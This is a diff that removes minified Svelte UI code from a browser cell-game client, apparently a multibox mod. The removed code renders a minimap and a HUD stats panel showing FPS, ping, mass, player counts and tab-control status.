-                    a = t(49853),
-                    o = t(35171),
-                    r = t(41949),
-                    l = t(54603);
-
-                function c($) {
-                    let e, t, s, i, n, a, o = $[17] && null != $[11] && h($),
-                        r = $[16] && null != $[10] && A($),
-                        l = $[14] && null != $[6] && u($),
-                        c = $[13] && 0 !== $[8] && d($),
-                        C = $[12] && 0 !== $[7] && g($),
-                        p = $[15] && null != $[9] && m($);
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), o && o.c(), t = (0, x.xem)(), r && r.c(), s = (0, x.xem)(), l && l.c(), i = (0, x.xem)(), c && c.c(), n = (0, x.xem)(), C && C.c(), a = (0, x.xem)(), p && p.c(), (0, x.CFu)(e, "class", "stats s-xbgjyv")
-                        },
-                        m($, h) {
-                            (0, x.Yry)($, e, h), o && o.m(e, null), (0, x.BCw)(e, t), r && r.m(e, null), (0, x.BCw)(e, s), l && l.m(e, null), (0, x.BCw)(e, i), c && c.m(e, null), (0, x.BCw)(e, n), C && C.m(e, null), (0, x.BCw)(e, a), p && p.m(e, null)
-                        },
-                        p($, x) {
-                            $[17] && null != $[11] ? o ? o.p($, x) : ((o = h($)).c(), o.m(e, t)) : o && (o.d(1), o = null), $[16] && null != $[10] ? r ? r.p($, x) : ((r = A($)).c(), r.m(e, s)) : r && (r.d(1), r = null), $[14] && null != $[6] ? l ? l.p($, x) : ((l = u($)).c(), l.m(e, i)) : l && (l.d(1), l = null), $[13] && 0 !== $[8] ? c ? c.p($, x) : ((c = d($)).c(), c.m(e, n)) : c && (c.d(1), c = null), $[12] && 0 !== $[7] ? C ? C.p($, x) : ((C = g($)).c(), C.m(e, a)) : C && (C.d(1), C = null), $[15] && null != $[9] ? p ? p.p($, x) : ((p = m($)).c(), p.m(e, null)) : p && (p.d(1), p = null)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), o && o.d(), r && r.d(), l && l.d(), c && c.d(), C && C.d(), p && p.d()
-                        }
-                    }
-                }
-
-                function h($) {
-                    let e, t;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.Qq7)($[11])
-                        },
-                        m($, s) {
-                            (0, x.Yry)($, e, s), (0, x.BCw)(e, t)
-                        },
-                        p($, e) {
-                            2048 & e[0] && (0, x.iQh)(t, $[11])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function A($) {
-                    let e, t, s;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.Qq7)($[10]), s = (0, x.Qq7)(" session")
-                        },
-                        m($, i) {
-                            (0, x.Yry)($, e, i), (0, x.BCw)(e, t), (0, x.BCw)(e, s)
-                        },
-                        p($, e) {
-                            1024 & e[0] && (0, x.iQh)(t, $[10])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function u($) {
-                    let e, t;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.Qq7)($[6])
-                        },
-                        m($, s) {
-                            (0, x.Yry)($, e, s), (0, x.BCw)(e, t)
-                        },
-                        p($, e) {
-                            64 & e[0] && (0, x.iQh)(t, $[6])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function d($) {
-                    let e, t, s, i = 1 == $[8] ? "" : "s",
-                        n;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.Qq7)($[8]), s = (0, x.Qq7)(" spectator"), n = (0, x.Qq7)(i)
-                        },
-                        m($, i) {
-                            (0, x.Yry)($, e, i), (0, x.BCw)(e, t), (0, x.BCw)(e, s), (0, x.BCw)(e, n)
-                        },
-                        p($, e) {
-                            256 & e[0] && (0, x.iQh)(t, $[8]), 256 & e[0] && i !== (i = 1 == $[8] ? "" : "s") && (0, x.iQh)(n, i)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function g($) {
-                    let e, t = s.A.Hdd($[7]) + "",
-                        i, n;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), i = (0, x.Qq7)(t), n = (0, x.Qq7)(" total mass")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t), (0, x.BCw)(e, i), (0, x.BCw)(e, n)
-                        },
-                        p($, e) {
-                            128 & e[0] && t !== (t = s.A.Hdd($[7]) + "") && (0, x.iQh)(i, t)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function m($) {
-                    let e, t, s;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.Qq7)("Restart in "), s = (0, x.Qq7)($[9])
-                        },
-                        m($, i) {
-                            (0, x.Yry)($, e, i), (0, x.BCw)(e, t), (0, x.BCw)(e, s)
-                        },
-                        p($, e) {
-                            512 & e[0] && (0, x.iQh)(s, $[9])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-                class C extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, c) {
-                            let h, A, u, d, g, m, C, p, f, _, w, v, b = ((0, x.j0C)(e, o.nK, $ => c(7, h = $)), (0, x.j0C)(e, o.$f, $ => c(8, A = $)), (0, x.j0C)(e, o.x4, $ => c(9, u = $)), (0, x.j0C)(e, o.U_, $ => c(10, d = $)), (0, x.j0C)(e, o.qo, $ => c(11, g = $)), !1),
-                                y = n.A.get("showHud") && n.A.get("minimapEnabled"),
-                                B = !1,
-                                F = n.A.get("showHud") && n.A.get("showMinimapStats"),
-                                I = n.A.get("hudScale"),
-                                D = (0, l.T5)(!1),
-                                N = ((0, x.j0C)(e, D, $ => c(18, v = $)), n.A.on("zrVIMz", ($, e) => {
-                                    "minimapEnabled" === $ && n.A.get("showHud") ? c(1, y = e) : "showHud" === $ ? (c(1, y = e && n.A.get("minimapEnabled")), c(3, F = e && n.A.get("showMinimapStats"))) : "hudScale" === $ ? c(4, I = e) : "showMinimapStats" === $ && c(3, F = e)
-                                }), o.qo.visible),
-                                E = ((0, x.j0C)(e, N, $ => c(17, w = $)), o.U_.visible),
-                                Q = ((0, x.j0C)(e, E, $ => c(16, _ = $)), o.x4.visible),
-                                k = ((0, x.j0C)(e, Q, $ => c(15, f = $)), (0, l.T5)(!1)),
-                                T = ((0, x.j0C)(e, k, $ => c(14, p = $)), o.$f.visible),
-                                S = ((0, x.j0C)(e, T, $ => c(13, C = $)), o.nK.visible),
-                                Y = ((0, x.j0C)(e, S, $ => c(12, m = $)), () => {
-                                    (0, x.vu6)(N, w = n.A.get("showClock"), w), (0, x.vu6)(E, _ = n.A.get("showSessionTime"), _), (0, x.vu6)(Q, f = n.A.get("showRestartTiming"), f), (0, x.vu6)(k, p = n.A.get("showPlayerCount"), p), (0, x.vu6)(T, C = n.A.get("showSpectators"), C), (0, x.vu6)(S, m = n.A.get("showTagTotalMass"), m)
-                                });
-                            s.A.on("gWdDAg", () => Y()), Y(), s.A.on("omMooP", $ => {
-                                c(2, B = $)
-                            });
-                            let z, R = ((0, r.Rc)(() => {
-                                    a.A.init(z)
-                                }), s.A.on("started", () => {
-                                    D.set(a.A.round = !!s.A.border.circle), a.A.SCp()
-                                }), s.A.on("PSbuQD", () => {
-                                    c(0, b = !1)
-                                }), s.A.on("OTySHI", () => {
-                                    c(0, b = !0)
-                                }), ($, e = !1) => {
-                                    if (e && $ < 1) return "instant";
-                                    var t = Math.floor(($ = Math.floor($)) / 60),
-                                        x = Math.floor(t / 60);
-                                    return t < 1 ? e ? $ + "s" : "<1min" : x < 1 ? t + "min" : t % 60 == 0 ? x + "hr" : x + "hr " + t % 60 + "min"
-                                }),
-                                M = performance.now(),
-                                L = 0,
-                                G = (s.A.on("NZB", $ => {
-                                    L = $
-                                }), s.A.on("GzmcRb", () => {
-                                    (0, x.vu6)(o.qo, g = new Date().toLocaleTimeString(), g);
-                                    var $ = (performance.now() - M) / 1e3;
-                                    (0, x.vu6)(o.U_, d = R($), d), L && s.A.KRz ? ($ = (L - s.A.KRz) / 25, (0, x.vu6)(o.x4, u = R($, !0), u)) : (0, x.vu6)(o.x4, u = null, u), (0, x.vu6)(o.$f, A = i.A.bTs, A), (0, x.vu6)(o.nK, h = i.A.biB, h)
-                                }), null),
-                                j = 0,
-                                H = 0;
-                            return s.A.FCi.on("JmnFrX", $ => {
-                                c(27, H++, H)
-                            }), s.A.FCi.on("seZDXL", $ => {
-                                c(27, H--, H)
-                            }), s.A.FCi.on("WnIviS", $ => {
-                                c(26, j++, j)
-                            }), s.A.FCi.on("KneCHr", $ => {
-                                c(26, j--, j)
-                            }), s.A.on("stopped", () => {
-                                c(6, G = null), c(26, j = c(27, H = 0)), (0, x.vu6)(o.$f, A = (0, x.vu6)(o.nK, h = 0, h), A)
-                            }), e.$$.update = () => {
-                                if (201326592 & e.$$.dirty[0]) {
-                                    var $;
-                                    let t = "";
-                                    t = i.A.selectedServer ? Math.min(j, $ = i.A.selectedServer.slots) + " / " + $ + " players" : j + " player" + (1 === j ? "" : "s"), t += " | " + H + " bot" + (1 === H ? "" : "s"), c(6, G = t)
-                                }
-                            }, [b, y, B, F, I, z, G, h, A, u, d, g, m, C, p, f, _, w, v, D, N, E, Q, k, T, S, j, H, function($) {
-                                x.Dnk[$ ? "unshift" : "push"](() => {
-                                    c(5, z = $)
-                                })
-                            }]
-                        }, function $(e) {
-                            let t, s, i, n, a = e[2] && e[3] && c(e);
-                            return {
-                                c() {
-                                    t = (0, x.ND4)("div"), a && a.c(), s = (0, x.xem)(), i = (0, x.ND4)("div"), n = (0, x.ND4)("canvas"), (0, x.CFu)(n, "class", "map canvas s-xbgjyv"), (0, x.CFu)(i, "class", "minimap-wrapper s-xbgjyv"), (0, x.goL)(i, "circle", e[18]), (0, x.CFu)(t, "class", "minimap-container s-xbgjyv"), (0, x.hgi)(t, "display", e[0] && e[1] ? "block" : "none"), (0, x.hgi)(t, "transform", "scale(" + e[4] + ")")
-                                },
-                                m($, o) {
-                                    (0, x.Yry)($, t, o), a && a.m(t, null), (0, x.BCw)(t, s), (0, x.BCw)(t, i), (0, x.BCw)(i, n), e[28](n)
-                                },
-                                p($, e) {
-                                    $[2] && $[3] ? a ? a.p($, e) : ((a = c($)).c(), a.m(t, s)) : a && (a.d(1), a = null), 262144 & e[0] && (0, x.goL)(i, "circle", $[18]), 3 & e[0] && (0, x.hgi)(t, "display", $[0] && $[1] ? "block" : "none"), 16 & e[0] && (0, x.hgi)(t, "transform", "scale(" + $[4] + ")")
-                                },
-                                i: x.lQ1,
-                                o: x.lQ1,
-                                d($) {
-                                    $ && (0, x.YoD)(t), a && a.d(), e[28](null)
-                                }
-                            }
-                        }, x.jXN, {}, null, [-1, -1])
-                    }
-                }
-                let p = C
-            },
-            98837($, e, t) {
-                t.d(e, {
-                    A: () => y
-                });
-                var x = t(83839),
-                    s = (t(60821), t(95195)),
-                    i = t(83529),
-                    n = t(54915),
-                    a = (t(63836), t(70679), t(95669));
-
-                function o($) {
-                    let e, t, s, i, n, o, p, w, b, y, B, F = $[3],
-                        I, D, N, E, Q = $[25] && $[24] && r($),
-                        k = $[27] && $[26] && l($),
-                        T = $[23] && $[22] && c($),
-                        S = $[19] && $[18] && h($),
-                        Y = $[21] && $[20] && A($),
-                        z = $[17] && $[16] && u($),
-                        R = $[14] && -1 != $[13] && d($),
-                        M = $[12] && -1 != $[11] && g($),
-                        L = $[10] && -1 != $[9] && m($),
-                        G = $[5] && C($),
-                        j = f($),
-                        H = $[28] && _($),
-                        U = $[8] && $[7] && v();
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), Q && Q.c(), t = (0, x.xem)(), k && k.c(), s = (0, x.xem)(), T && T.c(), i = (0, x.xem)(), S && S.c(), n = (0, x.xem)(), Y && Y.c(), o = (0, x.xem)(), z && z.c(), p = (0, x.xem)(), R && R.c(), w = (0, x.xem)(), M && M.c(), b = (0, x.xem)(), L && L.c(), y = (0, x.xem)(), G && G.c(), B = (0, x.xem)(), j.c(), I = (0, x.xem)(), H && H.c(), D = (0, x.xem)(), U && U.c(), (0, x.CFu)(e, "class", "stats-container s-fr5xtt"), (0, x.hgi)(e, "transform", "scale(" + $[2] + ")")
-                        },
-                        m($, a) {
-                            (0, x.Yry)($, e, a), Q && Q.m(e, null), (0, x.BCw)(e, t), k && k.m(e, null), (0, x.BCw)(e, s), T && T.m(e, null), (0, x.BCw)(e, i), S && S.m(e, null), (0, x.BCw)(e, n), Y && Y.m(e, null), (0, x.BCw)(e, o), z && z.m(e, null), (0, x.BCw)(e, p), R && R.m(e, null), (0, x.BCw)(e, w), M && M.m(e, null), (0, x.BCw)(e, b), L && L.m(e, null), (0, x.BCw)(e, y), G && G.m(e, null), (0, x.BCw)(e, B), j.m(e, null), (0, x.BCw)(e, I), H && H.m(e, null), (0, x.BCw)(e, D), U && U.m(e, null), E = !0
-                        },
-                        p($, a) {
-                            $[25] && $[24] ? Q ? Q.p($, a) : ((Q = r($)).c(), Q.m(e, t)) : Q && (Q.d(1), Q = null), $[27] && $[26] ? k ? k.p($, a) : ((k = l($)).c(), k.m(e, s)) : k && (k.d(1), k = null), $[23] && $[22] ? T ? T.p($, a) : ((T = c($)).c(), T.m(e, i)) : T && (T.d(1), T = null), $[19] && $[18] ? S ? S.p($, a) : ((S = h($)).c(), S.m(e, n)) : S && (S.d(1), S = null), $[21] && $[20] ? Y ? Y.p($, a) : ((Y = A($)).c(), Y.m(e, o)) : Y && (Y.d(1), Y = null), $[17] && $[16] ? z ? z.p($, a) : ((z = u($)).c(), z.m(e, p)) : z && (z.d(1), z = null), $[14] && -1 != $[13] ? R ? R.p($, a) : ((R = d($)).c(), R.m(e, w)) : R && (R.d(1), R = null), $[12] && -1 != $[11] ? M ? M.p($, a) : ((M = g($)).c(), M.m(e, b)) : M && (M.d(1), M = null), $[10] && -1 != $[9] ? L ? L.p($, a) : ((L = m($)).c(), L.m(e, y)) : L && (L.d(1), L = null), $[5] ? G ? G.p($, a) : ((G = C($)).c(), G.m(e, B)) : G && (G.d(1), G = null), 8 & a[0] && (0, x.jXN)(F, F = $[3]) ? (j.d(1), (j = f($)).c(), j.m(e, I)) : j.p($, a), $[28] ? H ? H.p($, a) : ((H = _($)).c(), H.m(e, D)) : H && (H.d(1), H = null), $[8] && $[7] ? U || ((U = v()).c(), U.m(e, null)) : U && (U.d(1), U = null), (!E || 4 & a[0]) && (0, x.hgi)(e, "transform", "scale(" + $[2] + ")")
-                        },
-                        i($) {
-                            E || ($ && (0, x.Dti)(() => {
-                                E && (N = N || (0, x.h86)(e, a.Rv, {
-                                    duration: 300
-                                }, !0)).run(1)
-                            }), E = !0)
-                        },
-                        o($) {
-                            $ && (N = N || (0, x.h86)(e, a.Rv, {
-                                duration: 300
-                            }, !1)).run(0), E = !1
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), Q && Q.d(), k && k.d(), T && T.d(), S && S.d(), Y && Y.d(), z && z.d(), R && R.d(), M && M.d(), L && L.d(), G && G.d(), j.d($), H && H.d(), U && U.d(), $ && N && N.end()
-                        }
-                    }
-                }
-
-                function r($) {
-                    let e, t, s, i, n;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("p"), (t = (0, x.ND4)("span")).textContent = "FPS", s = (0, x.xem)(), i = (0, x.ND4)("span"), n = (0, x.Qq7)($[24]), (0, x.CFu)(t, "class", "stat-name s-fr5xtt"), (0, x.CFu)(i, "class", "stat-value s-fr5xtt"), (0, x.CFu)(e, "class", "stat-item s-fr5xtt")
-                        },
-                        m($, a) {
-                            (0, x.Yry)($, e, a), (0, x.BCw)(e, t), (0, x.BCw)(e, s), (0, x.BCw)(e, i), (0, x.BCw)(i, n)
-                        },
-                        p($, e) {
-                            16777216 & e[0] && (0, x.iQh)(n, $[24])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function l($) {
-                    let e, t, s, i, n;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("p"), (t = (0, x.ND4)("span")).textContent = "Ping", s = (0, x.xem)(), i = (0, x.ND4)("span"), n = (0, x.Qq7)($[26]), (0, x.CFu)(t, "class", "stat-name s-fr5xtt"), (0, x.CFu)(i, "class", "stat-value s-fr5xtt"), (0, x.CFu)(e, "class", "stat-item s-fr5xtt")
-                        },
-                        m($, a) {
-                            (0, x.Yry)($, e, a), (0, x.BCw)(e, t), (0, x.BCw)(e, s), (0, x.BCw)(e, i), (0, x.BCw)(i, n)
-                        },
-                        p($, e) {
-                            67108864 & e[0] && (0, x.iQh)(n, $[26])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function c($) {
-                    let e, t, s, i, n;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("p"), (t = (0, x.ND4)("span")).textContent = "Mass", s = (0, x.xem)(), i = (0, x.ND4)("span"), n = (0, x.Qq7)($[22]), (0, x.CFu)(t, "class", "stat-name s-fr5xtt"), (0, x.CFu)(i, "class", "stat-value s-fr5xtt"), (0, x.CFu)(e, "class", "stat-item s-fr5xtt")
-                        },
-                        m($, a) {
-                            (0, x.Yry)($, e, a), (0, x.BCw)(e, t), (0, x.BCw)(e, s), (0, x.BCw)(e, i), (0, x.BCw)(i, n)
-                        },
-                        p($, e) {
-                            4194304 & e[0] && (0, x.iQh)(n, $[22])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function h($) {
-                    let e, t, s, i, n;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("p"), (t = (0, x.ND4)("span")).textContent = "Score", s = (0, x.xem)(), i = (0, x.ND4)("span"), n = (0, x.Qq7)($[18]), (0, x.CFu)(t, "class", "stat-name s-fr5xtt"), (0, x.CFu)(i, "class", "stat-value s-fr5xtt"), (0, x.CFu)(e, "class", "stat-item s-fr5xtt")
-                        },
-                        m($, a) {
-                            (0, x.Yry)($, e, a), (0, x.BCw)(e, t), (0, x.BCw)(e, s), (0, x.BCw)(e, i), (0, x.BCw)(i, n)
-                        },
-                        p($, e) {
-                            262144 & e[0] && (0, x.iQh)(n, $[18])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function A($) {
-                    let e, t, s, i, n;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("p"), (t = (0, x.ND4)("span")).textContent = "Total Mass", s = (0, x.xem)(), i = (0, x.ND4)("span"), n = (0, x.Qq7)($[20]), (0, x.CFu)(t, "class", "stat-name s-fr5xtt"), (0, x.CFu)(i, "class", "stat-value s-fr5xtt"), (0, x.CFu)(e, "class", "stat-item s-fr5xtt")
-                        },
-                        m($, a) {
-                            (0, x.Yry)($, e, a), (0, x.BCw)(e, t), (0, x.BCw)(e, s), (0, x.BCw)(e, i), (0, x.BCw)(i, n)
-                        },
-                        p($, e) {
-                            1048576 & e[0] && (0, x.iQh)(n, $[20])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function u($) {
-                    let e, t, s, i, n;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("p"), (t = (0, x.ND4)("span")).textContent = "Cells", s = (0, x.xem)(), i = (0, x.ND4)("span"), n = (0, x.Qq7)($[16]), (0, x.CFu)(t, "class", "stat-name s-fr5xtt"), (0, x.CFu)(i, "class", "stat-value s-fr5xtt"), (0, x.CFu)(e, "class", "stat-item s-fr5xtt")
-                        },
-                        m($, a) {
-                            (0, x.Yry)($, e, a), (0, x.BCw)(e, t), (0, x.BCw)(e, s), (0, x.BCw)(e, i), (0, x.BCw)(i, n)
-                        },
-                        p($, e) {
-                            65536 & e[0] && (0, x.iQh)(n, $[16])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function d($) {
-                    let e, t, s = 2 != $[13] ? " tab " + (1 + $[13]) : "both tabs",
-                        i;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("p"), t = (0, x.Qq7)("Mouse frozen on "), i = (0, x.Qq7)(s), (0, x.CFu)(e, "class", "stat-item s-fr5xtt")
-                        },
-                        m($, s) {
-                            (0, x.Yry)($, e, s), (0, x.BCw)(e, t), (0, x.BCw)(e, i)
-                        },
-                        p($, e) {
-                            8192 & e[0] && s !== (s = 2 != $[13] ? " tab " + (1 + $[13]) : "both tabs") && (0, x.iQh)(i, s)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function g($) {
-                    let e, t, s = 2 != $[11] ? "tab " + (1 + $[11]) : "both tabs",
-                        i;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("p"), t = (0, x.Qq7)("Movement stopped on "), i = (0, x.Qq7)(s), (0, x.CFu)(e, "class", "stat-item s-fr5xtt")
-                        },
-                        m($, s) {
-                            (0, x.Yry)($, e, s), (0, x.BCw)(e, t), (0, x.BCw)(e, i)
-                        },
-                        p($, e) {
-                            2048 & e[0] && s !== (s = 2 != $[11] ? "tab " + (1 + $[11]) : "both tabs") && (0, x.iQh)(i, s)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function m($) {
-                    let e, t, s = 2 != $[9] ? "tab " + (1 + $[9]) : "both tabs",
-                        i;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("p"), t = (0, x.Qq7)("Linesplitting on "), i = (0, x.Qq7)(s), (0, x.CFu)(e, "class", "stat-item s-fr5xtt")
-                        },
-                        m($, s) {
-                            (0, x.Yry)($, e, s), (0, x.BCw)(e, t), (0, x.BCw)(e, i)
-                        },
-                        p($, e) {
-                            512 & e[0] && s !== (s = 2 != $[9] ? "tab " + (1 + $[9]) : "both tabs") && (0, x.iQh)(i, s)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function C($) {
-                    let e, t;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("p"), t = (0, x.Qq7)($[6]), (0, x.CFu)(e, "class", "stat-item s-fr5xtt")
-                        },
-                        m($, s) {
-                            (0, x.Yry)($, e, s), (0, x.BCw)(e, t)
-                        },
-                        p($, e) {
-                            64 & e[0] && (0, x.iQh)(t, $[6])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function p($) {
-                    let e, t = $[3] ? "web-gl" : "canvas",
-                        s, i, n = $[4] ? "w/" : "w/o",
-                        a, o;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("p"), s = (0, x.Qq7)(t), i = (0, x.Qq7)(" renderer "), a = (0, x.Qq7)(n), o = (0, x.Qq7)(" anti-aliasing"), (0, x.CFu)(e, "class", "stat-item s-fr5xtt")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t), (0, x.BCw)(e, s), (0, x.BCw)(e, i), (0, x.BCw)(e, a), (0, x.BCw)(e, o)
-                        },
-                        p($, e) {
-                            8 & e[0] && t !== (t = $[3] ? "web-gl" : "canvas") && (0, x.iQh)(s, t), 16 & e[0] && n !== (n = $[4] ? "w/" : "w/o") && (0, x.iQh)(a, n)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function f($) {
-                    let e = $[4],
-                        t, s = p($);
-                    return {
-                        c() {
-                            s.c(), t = (0, x.Iex)()
-                        },
-                        m($, e) {
-                            s.m($, e), (0, x.Yry)($, t, e)
-                        },
-                        p($, i) {
-                            16 & i[0] && (0, x.jXN)(e, e = $[4]) ? (s.d(1), (s = p($)).c(), s.m(t.parentNode, t)) : s.p($, i)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(t), s.d($)
-                        }
-                    }
-                }
-
-                function _($) {
-                    let e = $[15],
-                        t, s = w($);
-                    return {
-                        c() {
-                            s.c(), t = (0, x.Iex)()
-                        },
-                        m($, e) {
-                            s.m($, e), (0, x.Yry)($, t, e)
-                        },
-                        p($, i) {
-                            32768 & i[0] && (0, x.jXN)(e, e = $[15]) ? (s.d(1), (s = w($)).c(), s.m(t.parentNode, t)) : s.p($, i)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(t), s.d($)
-                        }
-                    }
-                }
-
-                function w($) {
-                    let e, t;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("p"), t = (0, x.Qq7)($[15]), (0, x.CFu)(e, "class", "stat-item s-fr5xtt"), (0, x.hgi)(e, "white-space", "nowrap"), (0, x.hgi)(e, "text-overflow", "ellipsis")
-                        },
-                        m($, s) {
-                            (0, x.Yry)($, e, s), (0, x.BCw)(e, t)
-                        },
-                        p($, e) {
-                            32768 & e[0] && (0, x.iQh)(t, $[15])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function v() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("p")).innerHTML = "<b>Warning: Unstable latency detected!</b> <br/>\n        Dual gameplay may be affected", (0, x.CFu)($, "class", "warning s-fr5xtt")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-                class b extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, a) {
-                            let o, r, l, c, h, A, u, d, g, m, C, p, f, _, w, v, b, y, B, F, I, D, N, E, Q = ((0, x.j0C)(e, n.hZ, $ => a(6, r = $)), (0, x.j0C)(e, n.ZK, $ => a(7, l = $)), (0, x.j0C)(e, n.NC, $ => a(9, h = $)), (0, x.j0C)(e, n.Xt, $ => a(11, u = $)), (0, x.j0C)(e, n.KP, $ => a(13, g = $)), (0, x.j0C)(e, n.BW, $ => a(15, C = $)), (0, x.j0C)(e, n.Yo, $ => a(16, p = $)), (0, x.j0C)(e, n.fN, $ => a(18, _ = $)), (0, x.j0C)(e, n.fj, $ => a(20, v = $)), (0, x.j0C)(e, n.rd, $ => a(22, y = $)), (0, x.j0C)(e, n.uU, $ => a(24, F = $)), (0, x.j0C)(e, n.hU, $ => a(26, D = $)), !1),
-                                k = i.A.get("showHud") && i.A.get("showStats"),
-                                T = i.A.get("hudScale"),
-                                S = n.uU.visible,
-                                Y = ((0, x.j0C)(e, S, $ => a(25, I = $)), n.hU.visible),
-                                z = ((0, x.j0C)(e, Y, $ => a(27, N = $)), n.rd.visible),
-                                R = ((0, x.j0C)(e, z, $ => a(23, B = $)), n.fj.visible),
-                                M = ((0, x.j0C)(e, R, $ => a(21, b = $)), n.fN.visible),
-                                L = ((0, x.j0C)(e, M, $ => a(19, w = $)), n.Yo.visible),
-                                G = ((0, x.j0C)(e, L, $ => a(17, f = $)), n.ZK.visible),
-                                j = ((0, x.j0C)(e, G, $ => a(8, c = $)), n.hZ.visible),
-                                H = ((0, x.j0C)(e, j, $ => a(5, o = $)), n.KP.visible),
-                                U = ((0, x.j0C)(e, H, $ => a(14, m = $)), n.Xt.visible),
-                                q = ((0, x.j0C)(e, U, $ => a(12, d = $)), n.NC.visible);
-                            (0, x.j0C)(e, q, $ => a(10, A = $));
-                            var W = n.BW.visible;
-                            (0, x.j0C)(e, W, $ => a(28, E = $));
-                            let K = i.A.useWebGL,
-                                X = i.A.get("useAntialiasing");
-                            i.A.on("zrVIMz", ($, e) => {
-                                "useWebGL" === $ ? a(3, K = i.A.useWebGL) : "useAntialiasing" == $ ? a(4, X = i.A.get("useAntialiasing")) : "showStats" === $ && i.A.get("showHud") ? a(1, k = e) : "showHud" === $ ? a(1, k = e && i.A.get("showStats")) : "hudScale" === $ && a(2, T = e)
-                            }), e = () => {
-                                (0, x.vu6)(S, I = i.A.get("showFPS"), I), (0, x.vu6)(Y, N = i.A.get("showPing"), N), (0, x.vu6)(z, B = i.A.get("showPlayerMass"), B), (0, x.vu6)(R, b = i.A.get("showTotalPlayerMass"), b), (0, x.vu6)(M, w = i.A.get("showPlayerScore"), w), (0, x.vu6)(L, f = i.A.get("showCellCount"), f), (0, x.vu6)(G, c = i.A.get("showLatencyWarning"), c), (0, x.vu6)(j, o = !!r, o)
-                            }, s.A.on("uzPfcB", $ => {
-                                a(0, Q = $)
-                            }), s.A.on("oiKdMc", e), e(), s.A.on("TNRyrb", $ => {
-                                f && (0, x.vu6)(n.Yo, p = $, p)
-                            }), s.A.on("EMciAd", $ => {
-                                N && (0, x.vu6)(n.hU, D = $, D)
-                            }), s.A.on("DEPJkV", () => {
-                                var $;
-                                I && (0, x.vu6)(n.uU, F = Math.round(s.A.fps.average), F), B && ($ = s.A.score, (0, x.vu6)(n.rd, y = $ ? s.A.Hdd($) : "", y)), b && ($ = s.A.YIr, (0, x.vu6)(n.fj, v = $ ? s.A.Hdd($) : "", v)), w && ($ = s.A.fIW, (0, x.vu6)(n.fN, _ = $ ? s.A.Hdd($) : "", _)), f && (0, x.vu6)(n.Yo, p = s.A.cellCount, p)
-                            });
-                            let J = [, , ],
-                                P = [, , ],
-                                V = [, , ];
-                            return s.A.on("RAwTus", $ => {
-                                "mouseFrozen" in $ && (s.A.eWI.forEach(($, e) => {
-                                    J[e] = $.mouse.frozen
-                                }), J[0] ? (0, x.vu6)(n.KP, g = J[1] ? 2 : 0, g) : J[1] ? (0, x.vu6)(n.KP, g = 1, g) : (0, x.vu6)(n.KP, g = -1, g), (0, x.vu6)(H, m = 0 <= g, m)), "LZd" in $ && (s.A.eWI.forEach(($, e) => {
-                                    P[e] = $.mouse.centralize
